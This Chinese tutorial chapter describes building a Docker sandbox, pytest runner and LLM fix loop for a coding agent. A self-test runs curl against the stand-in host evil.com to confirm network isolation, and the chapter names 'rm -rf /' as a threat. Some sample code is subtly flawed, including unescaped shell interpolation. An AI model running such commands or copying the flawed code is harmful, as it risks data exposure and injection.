# Phase 5：Docker Sandbox + Auto Testing

> **返回主索引：** [0-1 coding.md](0-1%20coding.md)
> **上一阶段：** [Phase 4: Coding Agent](phase-4-coding-agent.md)
> **下一阶段：** [Phase 6: Memory System](phase-6-memory-system.md)

---

## 一、目标与定位

### 目标
构建**安全的代码执行环境**和**自动化测试闭环**：Docker 隔离执行 → pytest 运行测试 → 解析错误 → Agent 修复 → 重新测试。

### 在整体架构中的位置
Phase 5 完成 Agent 的"编程能力闭环"——之前 Phase 1-4 只能**写代码**，现在能**验证代码对不对**，不对还能**自动修复**。

```
LangGraph Executor (Phase 3) 
    → 生成/修改代码 (Phase 4)
    → Docker Sandbox 执行测试 (Phase 5)
    → 解析错误 → 自动修复 → 重新测试 (Phase 5 Fix Loop)
    → 测试通过 → 返回结果
```

### 本 Phase 不做什么
- ❌ 不做生产级容器编排（Kubernetes）
- ❌ 不做多容器网络编排
- ❌ 不做 Benchmark 系统（Phase 9 做）

---

## 二、前置依赖

| 依赖 | 用途 |
|------|------|
| Phase 3-4 完成 | LangGraph + Coding Agent |
| Docker | 容器运行时 |
| docker-py | Python Docker SDK |
| pytest | Python 测试框架 |

```bash
uv add docker pytest
```

---

## 三、目录结构

```text
app/
├── sandbox/
│   ├── __init__.py
│   ├── docker_runner.py         # Docker 容器管理（创建/运行/销毁）
│   ├── security.py              # 安全配置（资源限制、权限、网络）
│   ├── pytest_runner.py         # pytest 测试执行 + 结果解析
│   ├── error_parser.py          # 错误信息结构化解析
│   ├── fix_loop.py              # Fix Loop：错误 → 修复 → 重试
│   └── bad_case_analyzer.py     # Bad Case 收集与分析（新增）
│
├── sandbox_config/
│   ├── Dockerfile             # 沙箱镜像定义
│   └── seccomp_profile.json   # seccomp 安全策略（可选）
```

---

## 四、核心数据模型 / Schema 定义

### 4.1 Sandbox 配置

```python
from dataclasses import dataclass

@dataclass
class SandboxConfig:
    """Docker 沙箱安全配置"""
    image: str = "joyagent-sandbox:latest"
    
    # 资源限制
    cpu_limit: float = 1.0           # CPU 核心数
    memory_limit: str = "512m"       # 内存上限
    memory_swap: str = "0m"          # 禁止 swap
    
    # 时间限制
    timeout_seconds: int = 60        # 总执行超时
    
    # 文件系统
    read_only_root: bool = True      # 根文件系统只读
    working_dir: str = "/workspace"  # 工作目录（可读写）
    mount_path: str | None = None    # 宿主机路径挂载
    
    # 网络
    network_disabled: bool = True    # 默认禁止网络访问
    network_mode: str = "none"
    
    # 安全
    no_new_privileges: bool = True   # 禁止提权
    drop_capabilities: list[str] = None  # 丢弃的 Linux capabilities
    
    def __post_init__(self):
        if self.drop_capabilities is None:
            self.drop_capabilities = ["ALL"]  # 丢弃所有 capabilities
```

### 4.2 执行结果

```python
@dataclass
class ExecutionResult:
    """Docker 容器执行结果"""
    exit_code: int
    stdout: str
    stderr: str
    elapsed_seconds: float
    timed_out: bool = False
    error_message: str | None = None

@dataclass
class TestResult:
    """pytest 测试结果"""
    total: int
    passed: int
    failed: int
    errors: int
    
    @property
    def all_passed(self) -> bool:
        return self.failed == 0 and self.errors == 0

@dataclass
class TestFailure:
    """单个测试失败的详细信息"""
    test_name: str
    error_type: str               # "AssertionError" | "NameError" | "ImportError" | ...
    error_message: str
    file_path: str
    line_number: int | None
    traceback: str
```

### 4.3 Fix Loop 状态

```python
@dataclass
class FixLoopState:
    """自动修复循环的状态"""
    max_attempts: int = 3
    current_attempt: int = 0
    test_results: list[TestResult] = None
    fix_history: list[dict] = None   # [{attempt, diff, test_result}]
    
    def should_continue(self) -> bool:
        return self.current_attempt < self.max_attempts
    
    def should_escalate(self) -> bool:
        """连续失败 3 次 → 升级到人工介入"""
        return self.current_attempt >= self.max_attempts
```

---

## 五、详细开发清单（含 HOW）

### Step 1：创建 Sandbox Dockerfile（30 分钟）

**`sandbox_config/Dockerfile`：**
```dockerfile
FROM python:3.11-slim

# 安全：非 root 用户
RUN useradd -m -s /bin/bash sandbox
USER sandbox

# 预装测试依赖
RUN pip install --user pytest

WORKDIR /workspace
```

```bash
docker build -t joyagent-sandbox:latest -f sandbox_config/Dockerfile .
```

### Step 2：实现 Docker Runner（1 小时）⭐ 核心

**`sandbox/docker_runner.py`：**
```python
import docker
from docker.types import Mount

class DockerRunner:
    """Docker 沙箱安全执行器"""
    
    def __init__(self, config: SandboxConfig = None):
        self.client = docker.from_env()
        self.config = config or SandboxConfig()
    
    async def run_command(self, command: str, working_dir: str = None) -> ExecutionResult:
        """
        在 Docker 容器中安全执行命令。
        每次执行创建新容器，执行完立即销毁。
        """
        wd = working_dir or self.config.working_dir
        
        # 构建容器参数
        container_kwargs = {
            "image": self.config.image,
            "command": f"/bin/bash -c '{command}'",
            "working_dir": wd,
            
            # 资源限制
            "cpu_period": 100000,
            "cpu_quota": int(self.config.cpu_limit * 100000),
            "mem_limit": self.config.memory_limit,
            "memswap_limit": self.config.memory_swap,
            
            # 安全配置
            "read_only": self.config.read_only_root,
            "network_mode": "none" if self.config.network_disabled else "bridge",
            "no_new_privileges": self.config.no_new_privileges,
            "cap_drop": self.config.drop_capabilities,
            
            # 自动移除
            "auto_remove": True,
            "detach": True,
        }
        
        # 文件挂载（仅挂载必要的工作目录）
        if self.config.mount_path:
            container_kwargs["mounts"] = [
                Mount(
                    target=wd,
                    source=self.config.mount_path,
                    type="bind",
                    read_only=False,
                )
            ]
        
        import time
        start_time = time.time()
        
        try:
            container = self.client.containers.create(**container_kwargs)
            container.start()
            
            # 等待执行完成（带超时）
            result = container.wait(timeout=self.config.timeout_seconds)
            
            stdout = container.logs(stdout=True, stderr=False).decode("utf-8", errors="replace")
            stderr = container.logs(stdout=False, stderr=True).decode("utf-8", errors="replace")
            
            return ExecutionResult(
                exit_code=result["StatusCode"],
                stdout=stdout,
                stderr=stderr,
                elapsed_seconds=time.time() - start_time,
            )
        
        except Exception as e:
            return ExecutionResult(
                exit_code=-1,
                stdout="",
                stderr=str(e),
                elapsed_seconds=time.time() - start_time,
                timed_out="timeout" in str(e).lower(),
                error_message=str(e),
            )
        
        finally:
            # 确保容器被清理
            try:
                if 'container' in locals():
                    container.remove(force=True)
            except Exception:
                pass
```

**面试要点：回答时要能展开这些安全措施的设计原因。**

### Step 3：实现 Pytest Runner（1 小时）

**`sandbox/pytest_runner.py`：**
```python
import json
import re

class PytestRunner:
    """在 Docker Sandbox 中运行 pytest"""
    
    def __init__(self, docker_runner: DockerRunner):
        self.runner = docker_runner
    
    async def run_tests(self, test_path: str = ".") -> TestResult:
        """运行 pytest 并解析结果"""
        # 使用 --json-report 获取结构化输出
        command = f"python -m pytest {test_path} -v --tb=short --json-report --json-report-file=/tmp/test_report.json"
        
        result = await self.runner.run_command(command)
        
        # 尝试解析 JSON 报告
        return self._parse_result(result)
    
    def _parse_result(self, result: ExecutionResult) -> TestResult:
        """解析 pytest 输出为结构化测试结果"""
        # 方法 1：尝试读取 JSON 报告（如果 pytest-json-report 已安装）
        # 方法 2：解析文本输出（fallback）
        
        # Fallback：解析 pytest 的标准输出
        summary_match = re.search(
            r"(\d+) passed.*?(\d+) failed.*?(\d+) error",
            result.stdout + result.stderr
        )
        
        if summary_match:
            return TestResult(
                total=int(summary_match.group(1)) + int(summary_match.group(2)) + int(summary_match.group(3)),
                passed=int(summary_match.group(1)),
                failed=int(summary_match.group(2)),
                errors=int(summary_match.group(3)),
            )
        
        return TestResult(total=0, passed=0, failed=0, errors=0)
```

### Step 4：实现 Error Parser（30 分钟）

**`sandbox/error_parser.py`：**
```python
import re

class ErrorParser:
    """解析 Python traceback 为结构化错误信息"""
    
    # Python traceback 正则
    TRACEBACK_PATTERN = re.compile(
        r'File "(?P<file>[^"]+)", line (?P<line>\d+).*\n(?P<code>.*)\n(?P<error_type>\w+): (?P<message>.*)',
        re.MULTILINE
    )
    
    def parse(self, stderr: str) -> list[TestFailure]:
        """从 stderr 中提取所有错误"""
        failures = []
        
        for match in self.TRACEBACK_PATTERN.finditer(stderr):
            failures.append(TestFailure(
                test_name="unknown",  # 可从上下文推断
                error_type=match.group("error_type"),
                error_message=match.group("message"),
                file_path=match.group("file"),
                line_number=int(match.group("line")),
                traceback=stderr,
            ))
        
        return failures
    
    def categorize_error(self, failure: TestFailure) -> str:
        """
        将错误分类，帮助 Agent 决定修复策略：
        - "syntax" → 语法错误（需重写代码）
        - "import" → 依赖缺失（需安装包）
        - "assertion" → 逻辑错误（需分析逻辑）
        - "runtime" → 运行时错误（如 NameError）
        """
        if failure.error_type in ("SyntaxError", "IndentationError"):
            return "syntax"
        elif failure.error_type in ("ImportError", "ModuleNotFoundError"):
            return "import"
        elif failure.error_type == "AssertionError":
            return "assertion"
        else:
            return "runtime"
```

### Step 5：实现 Fix Loop（1 小时）

**`sandbox/fix_loop.py`：**
```python
class FixLoop:
    """
    自动修复循环。
    
    流程：
    ┌─────────┐     ┌──────────┐     ┌──────────┐     ┌──────────┐
    │ 运行测试 │ ──▶ │ 解析错误  │ ──▶ │ LLM 修复 │ ──▶ │ 应用修复  │
    └─────────┘     └──────────┘     │          │     └────┬─────┘
          ▲                          └──────────┘          │
          └────────────────────────────────────────────────┘
                         (循环直到测试通过或达到最大次数)
    """
    
    def __init__(self, docker_runner, client, max_attempts: int = 3):
        self.test_runner = PytestRunner(docker_runner)
        self.error_parser = ErrorParser()
        self.client = client  # Anthropic 原生客户端，非 LangChain llm 对象
        self.max_attempts = max_attempts
    
    async def fix_and_retest(self, test_path: str, source_code: str, 
                             error_context: str) -> FixLoopState:
        """主循环：测试 → 修复 → 重新测试"""
        state = FixLoopState(max_attempts=self.max_attempts)
        
        while state.should_continue():
            state.current_attempt += 1
            
            # 1. 运行测试
            test_result = await self.test_runner.run_tests(test_path)
            state.test_results.append(test_result)
            
            if test_result.all_passed:
                break  # 测试全部通过！
            
            # 2. 解析错误
            failures = self.error_parser.parse(test_result.stderr)
            
            # 3. 分类错误 → 确定修复策略
            error_categories = [self.error_parser.categorize_error(f) for f in failures]
            
            # 4. LLM 生成修复
            fix_prompt = f"""
            The following tests failed:
            {[f.error_message for f in failures]}
            
            Error categories: {error_categories}
            
            Source code:
            {source_code}
            
            Please fix the code to make all tests pass.
            Only output the fixed code, no explanation.
            """
            
            # Anthropic 原生调用（不含工具——Fix Loop 只做代码修复）
            response = self.client.messages.create(
                model=MODEL,
                system="You are a code fixer. Output only the fixed code, no explanation.",
                messages=[{"role": "user", "content": fix_prompt}],
                max_tokens=8192,
            )
            fixed_code = extract_text(response.content)
            
            # 5. 应用修复（通过 Phase 4 的 Diff/Patch 机制）
            patch_result = apply_patch(fixed_code, source_code)
            
            state.fix_history.append({
                "attempt": state.current_attempt,
                "errors": failures,
                "categories": error_categories,
                "patch_success": patch_result.success,
            })
            
            if not patch_result.success:
                continue  # 修复应用失败，重试
            
            # 更新源码，准备下一轮测试
            source_code = fixed_code
        
        return state
```

### Step 5.5：Bad Case 收集与分析（1 小时）

**设计目标：** 系统性收集 Fix Loop 失败的案例，结构化分析失败根因，驱动 Prompt 和 Skill 策略迭代优化。这是 Agent 从"能跑"到"跑得好"的关键基础设施。

**`app/sandbox/bad_case_analyzer.py`：**

```python
from dataclasses import dataclass, field
from collections import defaultdict
from app.sandbox.error_parser import TestFailure, ErrorParser
from app.sandbox.fix_loop import FixLoopState


@dataclass
class BadCase:
    """单个 Bad Case 记录"""
    task_description: str          # 用户原始任务描述
    task_category: str             # 任务类别：crud | algorithm | file_op | api_dev
    failures: list[TestFailure]    # 解析后的测试失败列表
    error_categories: list[str]    # 按 ErrorParser.categorize_error() 分类
    fix_attempts: int              # Fix Loop 尝试次数
    final_state: str               # "exhausted" | "timeout" | "gave_up"
    source_code: str               # 最后一次修复后的代码（供分析）
    timestamp: str = ""


class BadCaseAnalyzer:
    """Bad Case 分析引擎。
    
    分析流水线：
    1. 收集：Fix Loop 失败 → 自动创建 BadCase 记录
    2. 聚合：按错误类型 + 任务类别交叉聚合
    3. 诊断：定位高频失败模式，识别可疑 Prompt 段
    4. 输出：生成分析报告 + 改进建议
    """
    
    def __init__(self):
        self.cases: list[BadCase] = []
        self._error_parser = ErrorParser()
    
    # ─── 1. 收集 ──────────────────────────────────
    
    def collect(self, task: str, category: str, fix_state: FixLoopState,
                source_code: str, stderr: str) -> BadCase:
        """从 FixLoopState 中提取 Bad Case。
        
        调用时机：FixLoopState.should_escalate() == True 时
        """
        failures = self._error_parser.parse(stderr)
        error_cats = [self._error_parser.categorize_error(f) for f in failures]
        
        case = BadCase(
            task_description=task,
            task_category=category,
            failures=failures,
            error_categories=error_cats,
            fix_attempts=fix_state.current_attempt,
            final_state=self._determine_final_state(fix_state),
            source_code=source_code,
        )
        self.cases.append(case)
        return case
    
    # ─── 2. 聚合分析 ──────────────────────────────
    
    def aggregate_by_error_type(self) -> dict:
        """按错误类型聚合"""
        by_type = defaultdict(list)
        for case in self.cases:
            for cat in case.error_categories:
                by_type[cat].append(case)
        return dict(by_type)
    
    def aggregate_by_task_category(self) -> dict:
        """按任务类别聚合"""
        by_cat = defaultdict(list)
        for case in self.cases:
            by_cat[case.task_category].append(case)
        return dict(by_cat)
    
    def cross_aggregate(self) -> dict:
        """交叉聚合：任务类别 × 错误类型"""
        matrix = defaultdict(lambda: defaultdict(int))
        for case in self.cases:
            for cat in case.error_categories:
                matrix[case.task_category][cat] += 1
        return {k: dict(v) for k, v in matrix.items()}
    
    # ─── 3. 诊断 ──────────────────────────────────
    
    @dataclass
    class FailurePattern:
        """高频失败模式"""
        pattern_name: str            # 如 "CRUD 任务中的 ImportError"
        task_category: str
        error_type: str
        frequency: int
        ratio: float                 # 占同类任务的比例
        example_cases: list[BadCase]
    
    def detect_patterns(self, min_frequency: int = 2) -> list[FailurePattern]:
        """检测高频失败模式"""
        cross = self.cross_aggregate()
        total_by_cat = {
            cat: len(cases) 
            for cat, cases in self.aggregate_by_task_category().items()
        }
        
        patterns = []
        for task_cat, error_counts in cross.items():
            for error_type, count in error_counts.items():
                if count >= min_frequency:
                    example = [
                        c for c in self.cases
                        if c.task_category == task_cat 
                        and error_type in c.error_categories
                    ][:3]
                    patterns.append(self.FailurePattern(
                        pattern_name=f"{task_cat} 任务中的 {error_type} 错误",
                        task_category=task_cat,
                        error_type=error_type,
                        frequency=count,
                        ratio=count / total_by_cat[task_cat],
                        example_cases=example,
                    ))
        
        return sorted(patterns, key=lambda p: p.frequency, reverse=True)
    
    # ─── 4. 报告生成 ──────────────────────────────
    
    def generate_report(self) -> str:
        """生成分析报告（供开发者阅读，也可摘要后喂给 LLM）"""
        total = len(self.cases)
        if total == 0:
            return "No bad cases collected yet."
        
        patterns = self.detect_patterns()
        
        report = f"""
╔══════════════════════════════════════════════════════════╗
║              Bad Case 分析报告                            ║
╠══════════════════════════════════════════════════════════╣
║  总 Bad Case 数: {total:<43d}║
║  按错误类型分布:                                          ║
"""
        for err_type, cases in self.aggregate_by_error_type().items():
            report += f"║    {err_type:20s}: {len(cases):>4d}  ({len(cases)/total*100:5.1f}%){' ' * (30 - len(err_type))}║\n"
        
        report += f"""╠══════════════════════════════════════════════════════════╣
║  Top 失败模式:                                             ║
"""
        for i, p in enumerate(patterns[:5], 1):
            report += f"║  {i}. {p.pattern_name[:45]:45s} ║\n"
            report += f"║     发生 {p.frequency} 次 (占同类任务 {p.ratio*100:.0f}%){' ' * (30 - len(str(p.frequency)))}║\n"
        
        report += f"""╠══════════════════════════════════════════════════════════╣
║  改进建议:                                                 ║
"""
        suggestions = self._generate_suggestions(patterns)
        for s in suggestions:
            report += f"║  • {s[:50]:50s} ║\n"
        
        report += "╚══════════════════════════════════════════════════════════╝"
        return report
    
    def _generate_suggestions(self, patterns: list[FailurePattern]) -> list[str]:
        """根据失败模式生成改进建议"""
        suggestions = []
        for p in patterns[:5]:
            if p.error_type == "import":
                suggestions.append(
                    f"Prompt 增加依赖声明提示：在生成代码前先列出所需 import"
                )
            elif p.error_type == "assertion":
                suggestions.append(
                    f"Prompt 增加输出格式约束：明确期望的返回值类型和边界条件"
                )
            elif p.error_type == "syntax":
                suggestions.append(
                    f"考虑增加语法检查步骤：代码生成后先 compile() 检查再写入文件"
                )
            elif p.error_type == "runtime":
                suggestions.append(
                    f"Prompt 增加异常处理模板：要求生成的代码包含 try/except 关键路径"
                )
        if len(patterns) >= 3:
            suggestions.append(
                f"建议收集 ≥50 个 Bad Case 后做一次系统性 Prompt Review"
            )
        return suggestions
    
    # ─── 辅助 ──────────────────────────────────────
    
    def _determine_final_state(self, state: FixLoopState) -> str:
        if state.current_attempt >= state.max_attempts:
            return "exhausted"
        if state.test_results and state.test_results[-1].errors > 0:
            return "gave_up"
        return "timeout"


# 全局单例
bad_case_analyzer = BadCaseAnalyzer()
```

**集成到 Fix Loop 中（修改 `fix_loop.py`）：**

```python
async def fix_and_retest(self, task_description: str, task_category: str,
                         test_path: str, source_code: str) -> FixLoopState:
    state = FixLoopState(max_attempts=self.max_attempts)
    
    while state.should_continue():
        # ... 原有测试 → 修复逻辑 ...
    
    # Fix Loop 结束后，检查是否需要收集 Bad Case
    if state.should_escalate():
        bad_case_analyzer.collect(
            task=task_description,
            category=task_category,
            fix_state=state,
            source_code=source_code,
            stderr=last_stderr,
        )
        # 日志提示：可调用 bad_case_analyzer.generate_report() 查看分析
    
    return state
```

**与 Memory 系统联动预留（Phase 6）：**

```python
# Phase 6 接入点（在 bad_case_analyzer.py 中预留）
async def sync_to_long_term_memory(self):
    """将 Bad Case 同步到 ChromaDB，支持相似失败模式检索"""
    for case in self.cases:
        embedding = await generate_embedding(case.task_description)
        await chroma_collection.add(
            ids=[case.task_description[:64]],
            embeddings=[embedding],
            metadatas=[{
                "type": "bad_case",
                "task_category": case.task_category,
                "error_categories": ",".join(case.error_categories),
                "fix_attempts": case.fix_attempts,
            }],
        )
```

**面试要点：** 面试官问"你怎么优化 Agent 的表现"时，这套 Bad Case 分析流程就是你的回答主线——不是玄学调参，而是数据驱动的系统性方法。
- 在 LangGraph 的 Executor Node 中，代码生成后调用 Fix Loop
- 新增 Sandbox Node，在 Reflector 之前执行测试

---

## 六、关键代码模式与伪代码

### 6.1 Docker 安全模型（面试必问）

```python
# 安全层次（从外到内）
# Level 1：容器隔离
container = client.containers.create(
    read_only=True,           # 根文件系统只读
    network_mode="none",      # 无网络
    no_new_privileges=True,   # 禁止 setuid/setgid
    cap_drop=["ALL"],         # 丢弃所有 Linux capabilities
)

# Level 2：资源限制
container.update(
    cpu_quota=50000,          # 50% 单核 CPU
    mem_limit="256m",         # 256MB 内存
    memswap_limit="0m",       # 禁止 swap（防止绕过内存限制）
)

# Level 3：超时控制
container.wait(timeout=60)   # 60 秒强制终止

# Level 4：最小权限文件挂载
mounts = [Mount(
    target="/workspace",      # 只挂载工作目录
    source=host_path,
    type="bind",
    read_only=False,          # 工作目录可写
)]
# 不挂载 /var/run/docker.sock、/proc、/sys 等危险路径
```

### 6.2 Fix Loop 状态机

```text
START
  │
  ▼
┌──────────┐    通过    ┌──────────┐
│  pytest   │──────────▶│  SUCCESS  │
└────┬─────┘           └──────────┘
     │ 失败
     ▼
┌──────────┐
│ 解析错误  │
└────┬─────┘
     │
     ▼
┌──────────┐
│ 分类错误  │── ImportError ──▶ pip install + 重试
│          │── SyntaxError ──▶ LLM 重写代码 + 重试
│          │── AssertError ──▶ LLM 分析逻辑 + 修复 + 重试
└────┬─────┘
     │
     ▼
┌──────────┐
│ 应用修复  │
└────┬─────┘
     │
     ├── 修复成功 ──▶ pytest（循环）
     ├── 修复失败 ──▶ 重试 (attempt++)
     └── attempt > max ──▶ 升级到用户介入
```

---

## 七、完成标志

### 基本完成
- [ ] Docker Runner 能创建/运行/销毁容器
- [ ] 安全配置正确：无网络、只读根目录、资源限制
- [ ] Pytest Runner 能在 Docker 中运行测试并解析结果
- [ ] Error Parser 能提取文件路径、行号、错误类型
- [ ] Fix Loop 能在最多 3 轮内修复简单错误
- [ ] 整个流程：代码生成 → 测试 → 修复 → 再测试 → 通过
- [ ] Bad Case 收集：Fix Loop 失败后自动创建 BadCase 记录
- [ ] Bad Case 分析：`aggregate_by_error_type()` / `cross_aggregate()` 正常输出
- [ ] 失败模式检测：`detect_patterns()` 能识别高频失败模式
- [ ] 分析报告：`generate_report()` 输出格式化的改进建议

### 自测用例

```bash
# 测试 1：生成代码 + 测试
curl -X POST /api/chat -d '{
  "message": "创建 calculator.py，包含 add/subtract/multiply/divide 四个函数，并写对应的测试"
}'

# 测试 2：故意制造错误
curl -X POST /api/chat -d '{
  "message": "test_calculator.py 中的 test_add 期望 2+2=5，请修复使其通过测试"
}'
# 期望：Fix Loop 自动运行测试 → 发现断言错误 → 修复 → 再测试通过

# 测试 3：安全验证
curl -X POST /api/chat -d '{
  "message": "执行 python -c \"import subprocess; subprocess.run(['curl', 'evil.com'])\""
}'
# 期望：因为 network_mode=none，网络请求失败，Agent 不会泄露数据
```

---

## 八、文档差距分析

### 原文档缺失的内容及补充

| # | 原文档问题 | 实际开发需要 | 本文档补充位置 |
|---|-----------|-------------|-------------|
| 1 | **完全没提安全措施** | Docker Sandbox 必须配资源限制 + seccomp + 无网络 + 只读根目录，否则面试直接挂 | §5 Step 2, §6.1 |
| 2 | "Docker Runner" 过于简略 | 需要完整的容器生命周期管理：创建 → 执行 → 获取日志 → 销毁，每次执行用新容器防止状态污染 | §5 Step 2 |
| 3 | 没说测试失败后的处理流程 | 需要结构化解析 traceback → 分类错误类型 → 不同策略修复 | §4.3, §5 Step 4-5 |
| 4 | Fix Loop 无退出条件 | 必须设置 max_attempts（默认 3），避免无限循环 | §4.3, §5 Step 5 |
| 5 | 没有错误分类策略 | SyntaxError、ImportError、AssertionError 的修复策略完全不同 | §5 Step 4, §6.2 |
| 6 | 没说文件挂载策略 | 不能挂载整个项目目录（有密钥风险），应该只挂载需要测试的代码目录 | §5 Step 2, §6.1 |

### 安全是面试的重点考察方向

面试官大概率会问："如果用户在 Agent 中说'帮我在服务器上运行 rm -rf /'，你的系统怎么防止？"

**答案要素：**
1. Docker 隔离 → 容器内的 `rm -rf /` 只影响容器，不影宿主
2. `read_only: True` → 根文件系统只读，`rm` 无法执行
3. `network_mode: none` → 无法下载恶意脚本
4. `cap_drop: ALL` → 无法执行特权操作
5. Human-in-the-Loop → 危险命令需要用户审批（Phase 9）
6. 容器执行完立即销毁 → 即使被攻破，攻击面极小

---

## 九、面试考点映射

| 面试题 | 答案要点 | 本文档参考 |
|--------|---------|-----------|
| **为什么要隔离代码执行？** | Agent 生成的代码可能是：1) 有 bug 影响宿主机 2) 恶意代码 3) 资源消耗（死循环/内存泄漏）。Docker 提供进程/文件系统/网络三层隔离。 | §6.1 |
| **Docker Sandbox 如何实现安全？** | 六层防御：只读根目录 + 禁止网络 + 丢弃 capabilities + 资源限额 + 超时控制 + 最小权限挂载。 | §6.1 |
| **如何限制 Agent 权限？** | 技术上：Docker 安全配置；流程上：Human-in-the-Loop（Phase 9）；设计上：工具分级（is_dangerous 标记，Phase 2）。 | §6.1 |
| **Fix Loop 的退出策略？** | max_attempts=3 后升级到用户介入；连续相同错误 → 可能是设计问题，不应无限重试；Token 预算耗尽 → 止损机制。 | §4.3, §6.2 |
| **如何处理不同类型的测试失败？** | 分类处理：Syntax/Import → 直接修复代码；Assertion → 分析逻辑差异；Runtime → 检查上下文和依赖。不同类别不同 Prompt。 | §5 Step 4 |
| **如何系统性地优化 Agent 表现？** | 不靠玄学调参。数据驱动闭环：收集 Fix Loop 失败的 Bad Case → 按错误类型 × 任务类别交叉聚合 → 定位高频失败模式 → 针对性改进 Prompt/Tool Skill → Benchmark 回归验证完成率是否提升。这是 Production AI 系统的核心方法论。 | §5 Step 5.5 |
| **Bad Case 分析的具体维度？** | 1) 错误类型维度（syntax/import/assertion/runtime）；2) 任务类别维度（CRUD/算法/文件操作/API 开发）；3) 交叉维度（如"CRUD 任务中的 ImportError 高频"）；4) 时序维度（新 Prompt 版本后是否改善）。 | §5 Step 5.5 |
